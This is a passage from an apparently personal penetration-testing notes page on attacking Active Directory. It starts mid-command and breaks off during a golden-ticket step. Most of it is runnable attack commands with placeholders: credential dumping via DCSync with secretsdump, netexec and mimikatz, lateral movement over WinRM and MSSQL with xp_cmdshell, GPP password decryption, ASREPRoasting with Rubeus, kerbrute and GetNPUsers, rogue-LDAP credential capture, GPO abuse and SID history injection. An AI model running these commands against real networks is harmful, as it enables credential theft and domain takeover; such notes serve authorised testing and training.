secretsdump.py <span class="nt">-outputfile</span> &lt;<span class="nb">hash </span>file name&gt; <span class="nt">-just-dc</span> &lt;DC name without domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;DC IP&gt;

<span class="c"># this can also be achieved with crackmapexec / netexec:</span>
nxc smb &lt;DC IP or name&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--ntds</span>
</code></pre></div>

<p>this might seem surprising, but on top of NTLM hashes and kerberos keys, we might also obtain cleartext passwords in a <code>*.cleartext</code> file. this is because some accounts are set with reversible encryption, with a RC4 key stored in the registry. impacket&#39;s secretsdump.py gets it and decrypt the passwords automatically for us. those accounts are usually set that way because someone, somewhere (a service or app) might need a user&#39;s password for authentication. we can check if reversible encryption is set on a user account like this:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># check accounts with reversible encryption enabled:</span><span class="w">
</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'userAccountControl -band 128'</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">userAccountControl</span><span class="w">

</span><span class="c"># check with powerview:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">useraccountcontrol</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'*ENCRYPTED_TEXT_PWD_ALLOWED*'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="n">select</span><span class="w"> </span><span class="nx">samaccountname</span><span class="p">,</span><span class="nx">useraccountcontrol</span><span class="w">
</span></code></pre></div>

<p>we can also use <code>mimikatz</code> to leverage a user with DCSync rights, but we need to run it in the context of said user. <code>runas.exe</code> is very useful for this:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># spawn powershell session in context of user with DCSync rights:</span><span class="w">
</span><span class="n">runas</span><span class="w"> </span><span class="nx">/netonly</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell</span><span class="w">

</span><span class="c"># then perform the attack on mimikatz from that shell:</span><span class="w">
</span><span class="o">.</span><span class="n">\mimikatz.exe</span><span class="w">
</span><span class="c"># in mimikatz prompt, run the following:</span><span class="w">
</span><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">lsadump::dcsync</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="nx">\administrator</span><span class="w">
</span></code></pre></div>

<h3>moving around with RDP, PSRemoting/WinRM, and MSSQL</h3>

<p>if we didn&#39;t make a lot of progress and no user with local admin rights can be compromised yet, not all is lost. RDP, WinRM, and MSSQL can be used for lateral or vertical movement.</p>

<p>even if an user is not a local admin, they can have RDP rights for some internal reason. this can enable us to hop on other hosts and potentially find vulnerabilites and/or credentials there:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># get all users able to RDP to a</span><span class="w">
</span><span class="c"># host with powerview:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-NetLocalGroupMember</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="s2">"Remote Desktop Users"</span><span class="w">
</span></code></pre></div>

<p><code>bloodhound</code> is very valuable to find the same thing, with pre-build queries to find workstations or servers where domain users can RDP.</p>

<p>the process is very similar to find hosts that enable WinRM access to all or a number of domain users:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># get all users able to WinRM to a</span><span class="w">
</span><span class="c"># host with powerview:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-NetLocalGroupMember</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="s2">"Remote Management Users"</span><span class="w">
</span></code></pre></div>

<p>with <code>bloodhound</code>, we can use the following raw query to find the same thing:</p>

<div class="highlight"><pre class="highlight shell"><code>MATCH <span class="nv">p1</span><span class="o">=</span>shortestPath<span class="o">((</span>u1:User<span class="o">)</span>-[r1:MemberOf<span class="k">*</span>1..]-&gt;<span class="o">(</span>g1:Group<span class="o">))</span> MATCH <span class="nv">p2</span><span class="o">=(</span>u1<span class="o">)</span>-[:CanPSRemote<span class="k">*</span>1..]-&gt;<span class="o">(</span>c:Computer<span class="o">)</span> RETURN p2
</code></pre></div>

<p>if we can connect, we can establish a WinRM session from a windows host:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"&lt;DC name without domain\&lt;user name&gt;"</span><span class="p">,</span><span class="w"> </span><span class="nv">$password</span><span class="p">)</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w">
</span></code></pre></div>

<p>from a linux host, we can use <code>evil-winrm</code> instead:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># connect with credentials:</span>
evil-winrm <span class="nt">-i</span> &lt;computer IP&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt;
</code></pre></div>

<p>finally, SQL admin rights are also interesting for vertical and lateral movement. we can find users with sysadmin privileges on <code>bloodhound</code> with the following raw query:</p>

<div class="highlight"><pre class="highlight shell"><code>MATCH <span class="nv">p1</span><span class="o">=</span>shortestPath<span class="o">((</span>u1:User<span class="o">)</span>-[r1:MemberOf<span class="k">*</span>1..]-&gt;<span class="o">(</span>g1:Group<span class="o">))</span> MATCH <span class="nv">p2</span><span class="o">=(</span>u1<span class="o">)</span>-[:SQLAdmin<span class="k">*</span>1..]-&gt;<span class="o">(</span>c:Computer<span class="o">)</span> RETURN p2
</code></pre></div>

<p>if we find a user with such privileges that we can connect to, <a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet" rel="nofollow">PowerUpSQL</a> can be a great tool to leverage this access:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># import PowerUpSQL:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerUpSQL.ps1</span><span class="w">

</span><span class="c"># get MSSQL instances:</span><span class="w">
</span><span class="n">Get-SQLInstanceDomain</span><span class="w">

</span><span class="c"># connect to MSSQL instance</span><span class="w">
</span><span class="c"># and run a query:</span><span class="w">
</span><span class="n">Get-SQLQuery</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="s2">"&lt;instance IP&gt;,&lt;instance port&gt;"</span><span class="w"> </span><span class="nt">-username</span><span class="w"> </span><span class="s2">"&lt;DC name without domain&gt;\&lt;usernae&gt;"</span><span class="w"> </span><span class="nt">-password</span><span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span><span class="nt">-query</span><span class="w"> </span><span class="s1">'&lt;MSSQL query&gt;'</span><span class="w">
</span></code></pre></div>

<p>from a linux host, <code>mssqlclient.py</code> from impacket is a great option as well:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># connect to MSSQL instance:</span>
mssqlclient.py &lt;DC name without domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;instance IP&gt; <span class="nt">-windows-auth</span>

<span class="c"># from mssqlclient's prompt,</span>
<span class="c"># we can try to enable xp_cmdshell</span>
<span class="c"># to run system commands:</span>
enable_xp_cmdshell
<span class="c"># check if our user has SeImpersonatePrivilege</span>
<span class="c"># right for privilege escalation, which could</span>
<span class="c"># be very likely:</span>
xp_cmdshell <span class="nb">whoami</span> /priv
</code></pre></div>

<h3>windows vulnerabilities</h3>

<p>windows vulns, especially recent ones, are always a great path to privilege escalation. we cover a few of them on <a href="https://ovelny.sh/chaos/windows-exploitation/common-exploits-and-privescs/" rel="nofollow">this page</a>, as they are both applicable inside and outside of an active directory exploitation context.</p>

<h3>microsoft exchange misconfiguration</h3>

<p>several misconfigurations can be leveraged for privilege escalation and more. an important part of those misconfigurations can be found within microsoft exchange.</p>

<p>when microsoft exchange is installed within an AD environment, members of the <code>exchange windows permissions</code> group can write a DACL to the domain object. this in turn, could be exploited to give a user DCSync privileges. a DACL misconfiguration could also allow us to add accounts to this group first. this could also work by using a compromised account from the <code>account operators</code> group.</p>

<p>another group is the <code>organization management</code> group, which can be considered the domain admins group of microsoft exchange: it can access mailboxes of all domain users, and sysadmins are often members of this group. additionally, this group has complete control over the <code>microsoft exchange security groups</code> OU, which contains the <code>exchange windows permissions</code> group.</p>

<p>in short, try to compromise an exchange server if there is one, as this will often allow us to gain domain admin privileges. dumping credentials in memory from an exchange server can also give us a tremendous advantage.</p>

<p><a href="https://github.com/gdedrouas/Exchange-AD-Privesc" rel="nofollow">more techniques for exchange privilege escalations can be found in this repo.</a></p>

<p>another interesting flaw in microsoft exchange is the privexchange attack: it leverages the <code>PushSubscription</code> feature, which is over-privileged and can lead to a dump of the NTDS database.</p>

<h3>printnightmare</h3>

<p>there is a bug in MS-RPRN protocol (print system remote protocol) that can lead to DCSync privileges: by connecting as any domain user to the spool&#39;s named pipe with the <code>RpcOpenPrinter</code> method and use the <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code> method, we can force the server to authenticate to any host over SMB.</p>

<p>this can also be used to relay LDAP authentication and grant RBCD privileges (resource-based constrained delegation), giving us privileges to authenticate as any user on the target&#39;s computer. this can then be leveraged to compromise a partner&#39;s domain controller, if we already have administrative access to the first domain controller.</p>

<p><a href="https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/" rel="nofollow">more about this bug can be found here.</a></p>

<p>this <a href="https://github.com/NotMedic/NetNTLMtoSilverTicket" rel="nofollow">tool</a> can be used to check for this vulnerability on accessible machines.</p>

<p>another <a href="http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment" rel="nofollow">tool</a> is available from a now deleted repo, that we can use like this:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SecurityAssessment.ps1</span><span class="w">
</span><span class="n">Get-SpoolStatus</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">machine</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="o">.</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h3>MS14-068</h3>

<p>this flaw allows us to elevate our privileges to domain admin from standard domain user credentials. this vulnerability lets us forge a PAC (privilege attribute certificate) that the KDC will identify as legitimate, thus granting membership in the domain administrators group or any other group. impacket can be used to exploit this vulnerability.</p>

<h3>LDAP credentials</h3>

<p>many apps use their web admin console to store LDAP credentials, and such consoles often have weak of default passwords in use.</p>

<p>another venue of attack for these apps and services are their test connection functions, which we can exploit by setting up a netcat listener on our attack box and change the LDAP IP address on these apps, so they connect to our machine instead of LDAP. they will send credentials to establish connection, often in cleartext.</p>

<p>sometimes, this tactic requires to set up a full LDAP server, <a href="https://grimhacker.com/2018/03/09/just-a-printer/" rel="nofollow">as shown in this article.</a></p>

<h3>passwords in description fields</h3>

<p>sometimes, passwords can simply be found in user account description fields or note fields. we can enumerate them with powerview:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">samaccountname</span><span class="p">,</span><span class="nx">description</span><span class="w"> </span><span class="o">|</span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Description</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="bp">$null</span><span class="p">}</span><span class="w">
</span></code></pre></div>

<h3>PASSWD_NOTREQD fields</h3>

<p>if a domain account has the <code>passwd_notreqd</code> field set in the <code>userAccountControl</code> attribute, we can infer their passwords might be easier to bruteforce because they do not comply with the password policy length of the domain. it may even be a blank password if we&#39;re lucky. we can enumerate them with powerview too:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-UACFilter</span><span class="w"> </span><span class="nx">PASSWD_NOTREQD</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">samaccountname</span><span class="p">,</span><span class="nx">useraccountcontrol</span><span class="w">
</span></code></pre></div>

<h3>credentials in SMB shares / SYSVOL share</h3>

<p>the SYSVOL share is readable to all authenticated users on domain, and can contain a handful of scripts and data that is worth enumerating for credentials.</p>

<p>it&#39;s also worth nothing that whenever a new GPP is created (group policy preferences), an .xml file is generated in the SYSVOL share as well in endpoints related to the defined group policy. the configuration and passwords they contain can be very valuable. for instance, the <code>cpassword</code> attribute is encrypted with AES-256 but the private key has been made available by microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" rel="nofollow">here.</a></p>

<p>this flaw has been patched in 2014 but groups.xml files with passwords can still be found. we can decrypt them with <code>gpp-decrypt</code> on our attack box:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># decrypt cpassword attribute:</span>
gpp-decrypt &lt;password <span class="nb">hash</span><span class="o">&gt;</span>
</code></pre></div>

<p>to find GPP passwords, <code>Get-GPPPassword.ps1</code> can be used among a variety of scripts and a metasploit post module. we can also use netexec/crackmapexec:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># list gpp modules of netexec. this</span>
<span class="c"># should list gpp_autologin and</span>
<span class="c"># gpp_password at the very least:</span>
nxc smb <span class="nt">-L</span> | <span class="nb">grep </span>gpp

<span class="c"># when autologon is configured via group</span>
<span class="c"># policy, we can find passwords in files</span>
<span class="c"># like Registry.xml. this feature should</span>
<span class="c"># be set locally on the host but that's not</span>
<span class="c"># always the case:</span>
nxc smb &lt;DC IP&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-M</span> gpp_autologin
</code></pre></div>

<p>we can also check for GPP autologon on a windows host with the <code>Get-GPPAutologon.ps1</code> script.</p>

<p>keep in mind that GPP passwords are often created for legacy and deleted accounts, but they are still worth using in a password spraying attack because of password re-use.</p>

<h3>ASREPRoasting</h3>

<p>ASREPRoasting is a kerberos flaw that allows us to obtain the TGT of any account that enabled the <code>do not require kerberos pre-authentication</code> setting. if enabled, we can request a TGT encrypted with the password of the affected account. the pre-auth step that is left disabled makes the user encrypt a timestamp with their password during authentication instead, which the DC decrypts to validate the password.</p>

<p>it&#39;s also worth noting that if we have <code>GenericWrite</code> or <code>GenericAll</code> permissions over our target, we can simply enable this setting to get an encrypted TGT just the same way.</p>

<p>once we get the encrypted TGT, we can try to crack it offline with hashcat or john as shown earlier in this document. just like kerberoasting, this attack relies on the password being weak enough to be cracked in the first place.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># enable DONT_REQ_PREAUTH with bloodyAD</span>
<span class="c"># if we have GenericWrite or GenericAll</span>
<span class="c"># permissions, from attack box:</span>
bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-d</span> &lt;DC name with domain, all lowercase&gt; <span class="nt">--host</span> &lt;DC or host IP&gt; add uac <span class="nt">-f</span> DONT_REQ_PREAUTH &lt;target username&gt;
</code></pre></div><div class="highlight"><pre class="highlight powershell"><code><span class="c"># enumerate user with preauth disabled with</span><span class="w">
</span><span class="c"># powerview:</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-PreauthNotRequired</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">samaccountname</span><span class="p">,</span><span class="nx">userprincipalname</span><span class="p">,</span><span class="nx">useraccountcontrol</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">

</span><span class="c"># once we have a target's samaccountname,</span><span class="w">
</span><span class="c"># obtain the AS-REP with rubeus. if using</span><span class="w">
</span><span class="c"># hashcat for offline cracking, use mode</span><span class="w">
</span><span class="c"># 18200:</span><span class="w">
</span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">asreproast</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/format:</span><span class="err">&lt;</span><span class="nx">hashcat</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">john</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p><code>kerbrute</code> automatically performs ASREPRoasting as well:</p>

<div class="highlight"><pre class="highlight shell"><code>kerbrute userenum <span class="nt">-d</span> &lt;DC name with domain&gt; <span class="nt">--dc</span> &lt;DC IP&gt; &lt;wordlist path&gt;
</code></pre></div>

<p><code>GetNPUsers.py</code> from impacket can also identify account with preauth disabled from a userlist. if used with a wordlist instead, it can still identify valid accounts, but only those vulnerable to ASPREPRoasting:</p>

<div class="highlight"><pre class="highlight shell"><code>GetNPUsers.py &lt;DC name with domain, all caps&gt;/ <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> &lt;userlist&gt;
</code></pre></div>

<h3>GPO abuse</h3>

<p>group policy objects are powerful to harden an AD environment but they can also be misused if misconfigured. we can add additional rights to a user, add a local admin to one or several hosts, or create a scheduled task that could be used for lateral movement, privilege escalation or persistence.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># list all GPOs with powerview:</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-DomainGPO</span><span class="w"> </span><span class="o">|</span><span class="n">select</span><span class="w"> </span><span class="nx">displayname</span><span class="w">

</span><span class="c"># if GPO management tools are installed,</span><span class="w">
</span><span class="c"># we can perform the same thing with</span><span class="w">
</span><span class="c"># Get-GPO:</span><span class="w">
</span><span class="n">Get-GPO</span><span class="w"> </span><span class="nt">-All</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">DisplayName</span><span class="w">

</span><span class="c"># check if the entire domain users</span><span class="w">
</span><span class="c"># group has rights over one or several</span><span class="w">
</span><span class="c"># GPOs:</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="nv">$sid</span><span class="o">=</span><span class="n">Convert-NameToSid</span><span class="w"> </span><span class="s2">"Domain Users"</span><span class="w">
</span><span class="n">Get-DomainGPO</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-ObjectAcl</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$sid</span><span class="p">}</span><span class="w">

</span><span class="c"># convert GPO GUID to name:</span><span class="w">
</span><span class="n">Get-GPO</span><span class="w"> </span><span class="nt">-Guid</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">GUID</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>tools like <a href="https://github.com/FSecureLABS/SharpGPOAbuse" rel="nofollow">sharpGPOabuse</a> can be used to leverage global policy objects, but we have to remain careful and not give ourselves rights over too many hosts.</p>

<h3>domain trust attacks</h3>

<p>trust between domains and forests can be leveraged to our advantage. let&#39;s do a quick recap of various trusts we will encounter, using maybe not so accurate analogies. first, let&#39;s address the two trust types we can find: transitive or non-transitive.</p>

<ul>
<li>a transitive trust is essentially a &quot;friends of my friends are also my friends&quot; type of trust. if Bob trusts Alice and Alice trusts Erin, then Bob directly trusts Erin too.</li>
<li>a non-transitive trust is a restricted kind of trust: Bob trusts Alice and only Alice, no matter who she trusts on her end.</li>
</ul>

<p>on top of these types, trusts can take two different directions:</p>

<ul>
<li>one-way trust: user from one domain can access resources from another domain who trusts them, but not the other way around. Bob trusts Alice so she can take snacks from his desk, but Alice doesn&#39;t trust Bob.</li>
<li>bidirectional trust: Bob trusts Alice and Alice trusts Bob, both can take snacks from each other&#39;s desks.</li>
</ul>

<p>those trusts can then be set up in the following ways:</p>

<ul>
<li>parent-child: two or more domains within the same forest, trusting each other transitively.</li>
<li>cross-link: child domains trusting each other directly to speed up auth. like siblings trusting each other without needing to refer to their parents.</li>
<li>external: two domains in separate forests trusting each other non-transitively. the forests are not joined and do not trust each other. like two friends working for drastically opposed companies.</li>
<li>tree-root: the default two-way transitive trust when you create a new root domain within a forest. like a new tree species growing harmoniously within a forest.</li>
<li>forest: simply a transitive trust between two forest root domains.</li>
</ul>

<p>we can live off the land and enumerate domain trust relationships with <code>Get-ADTrust</code> in powershell, or <code>netdom</code> in cmd:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># list domain trusts:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">activedirectory</span><span class="w">
</span><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">

</span><span class="c"># query domain trusts with netdom:</span><span class="w">
</span><span class="n">netdom</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">trust</span><span class="w">

</span><span class="c"># query domain controllers:</span><span class="w">
</span><span class="n">netdom</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dc</span><span class="w">

</span><span class="c"># query workstations and servers:</span><span class="w">
</span><span class="n">netdom</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">workstation</span><span class="w">
</span></code></pre></div>

<p>other tools can perform similar tasks, like <code>powerview</code>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># list domain trusts with powerview:</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-DomainTrust</span><span class="w">

</span><span class="c"># list types of trust, trust directions</span><span class="w">
</span><span class="c"># and other info:</span><span class="w">
</span><span class="n">Get-DomainTrustMapping</span><span class="w">

</span><span class="c"># list all users in child domain:</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">child</span><span class="w"> </span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">SamAccountName</span><span class="w">
</span></code></pre></div>

<p>trust relationships can also be visualized with <code>bloodhound</code> by using the <code>map domain trusts</code> pre-built query.</p>

<h4>SID history injection</h4>

<p>when a user is migrated to another domain, a new account is created for them in the new domain. the previous user&#39;s SID is then stored in the new account via the SID history attribute. the presence of previous SIDs in this attribute ensures that the new account retains the same permissions. it is usually done across domains but also works in the same domain.</p>

<p>with mimikatz, we can perform SID injection and add an admin account&#39;s SID in the history of an account we control, thus granting us the same access, and ability to perform DCSync, create a golden ticket, kerberos TGT, etc.</p>

<p>this follows a few rules however: this attack is viable when we compromised a child domain and want to compromise a parent domain. there won&#39;t be any SID filtering protection within the same forest, and we will be able to set the SID history of our user to the parent&#39;s enterprise admins or domain admins group.</p>

<p>this won&#39;t actually make them part of any of these groups, but they will have full access to the parent domain just as if they were.</p>

<p>we need the following things to perform this attack:</p>

<ul>
<li>the child domain&#39;s KRBTGT hash</li>
<li>the child domain&#39;s SID</li>
<li>the child domain&#39;s FQDN</li>
<li>the enterprise admins or domain admins group&#39;s SID</li>
<li>the target user&#39;s name in the child domain (doesn&#39;t even need to exist)</li>
<li>mimikatz! or rubeus</li>
</ul>

<p>logging as domain admin of the child domain we compromised, we can start gathering those elements:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># get KRBTGT's hash with mimikatz by</span><span class="w">
</span><span class="c"># performing DCSync:</span><span class="w">
</span><span class="o">.</span><span class="n">\mimikatz.exe</span><span class="w">
</span><span class="c"># in mimikatz' prompt:</span><span class="w">
</span><span class="n">lsadump::dcsync</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">child</span><span class="s1">'s DC subdomain, all caps&gt;\krbtgt

# get child domain'</span><span class="nx">s</span><span class="w"> </span><span class="nx">SID</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">powerview.</span><span class="w">
</span><span class="c"># note that the SID is also visible in</span><span class="w">
</span><span class="c"># previous mimikatz' output:</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-DomainSID</span><span class="w">

</span><span class="c"># get enterprise admins group's SID</span><span class="w">
</span><span class="c"># with powerview:</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-DomainGroup</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">parent</span><span class="s1">'s DC name with domain&gt; -Identity "Enterprise Admins" | select distinguishedname,objectsid
</span></code></pre></div>

<p>we can now create a golden ticket with mimikatz thanks to what we gathered:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># run mimikatz prompt:</span><span class="w">
</span><span class="o">.</span><span class="n">\mimikatz.exe</span><span class="w">

</span><span class="c"># in prompt, create a golden ticket.</span><span class="w">
</span><span class="c"># keep in mind that the user doesn't need</span><span class="w">
</span><span class="c"># to exist so we can just invent one:</span><span class="w">
